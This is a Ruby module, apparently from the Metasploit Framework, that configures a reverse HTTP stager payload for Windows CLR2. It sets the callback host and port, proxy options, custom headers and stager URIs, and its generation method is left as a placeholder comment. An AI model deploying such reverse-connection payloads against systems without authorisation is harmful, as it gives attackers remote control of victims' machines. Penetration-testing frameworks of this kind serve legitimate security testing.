# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
#
###

module Payload::Clr2::ReverseHttp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Clr2
  include Msf::Payload::UUID::Options

  #
  # Register reverse_http specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [ OptInt.new('StagerURILength', 'The URI length for the stager (at least 5 bytes)') ] +
      Msf::Opt::stager_retry_options +
      Msf::Opt::http_header_options +
      Msf::Opt::http_proxy_options
    )
  end

  #
  # Generate the first stage
  #
  def generate(opts={})
    ds = opts[:datastore] || datastore
    conf = {
      ssl:         opts[:ssl] || false,
      host:        ds['LHOST'] || '127.127.127.127',
      port:        ds['LPORT'],
      retry_count: ds['StagerRetryCount'],
      retry_wait:  ds['StagerRetryWait']
    }

    # Add extra options if we have enough space
    if self.available_space.nil? || required_space <= self.available_space
      conf[:url]            = luri + generate_uri(opts)
      conf[:exitfunk]       = ds['EXITFUNC']
      conf[:ua]             = ds['HttpUserAgent']
      conf[:proxy_host]     = ds['HttpProxyHost']
      conf[:proxy_port]     = ds['HttpProxyPort']
      conf[:proxy_user]     = ds['HttpProxyUser']
      conf[:proxy_pass]     = ds['HttpProxyPass']
      conf[:proxy_type]     = ds['HttpProxyType']
      conf[:custom_headers] = get_custom_headers(ds)
    else
      # Otherwise default to small URIs
      conf[:url]        = luri + generate_small_uri
    end

    generate_reverse_http(conf)
  end

  #
  # Generate the custom headers string
  #
  def get_custom_headers(ds)
    headers = ""
    headers << "Host: #{ds['HttpHostHeader']}\r\n" if ds['HttpHostHeader']
    headers << "Cookie: #{ds['HttpCookie']}\r\n" if ds['HttpCookie']
    headers << "Referer: #{ds['HttpReferer']}\r\n" if ds['HttpReferer']

    if headers.length > 0
      headers
    else
      nil
    end
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_http(opts={})
    #'THIS IS WHERE THE CLR2 HTTP STAGER PAYLOAD GOES'
    generate_uri(opts)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_uri(opts={})
    ds = opts[:datastore] || datastore
    uri_req_len = ds['StagerURILength'].to_i

    # Choose a random URI length between 30 and 255 bytes
    if uri_req_len == 0
      uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    end

    if uri_req_len < 5
      raise ArgumentError, "Minimum StagerURILength is 5"
    end

    generate_uri_uuid_mode(:init_clr2, uri_req_len)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_small_uri
    generate_uri_uuid_mode(:init_clr2, 30)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Proxy options?
    space += 200

    # Custom headers? Ugh, impossible to tell
    space += 512

    # The final estimated size
    space
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end

end

end

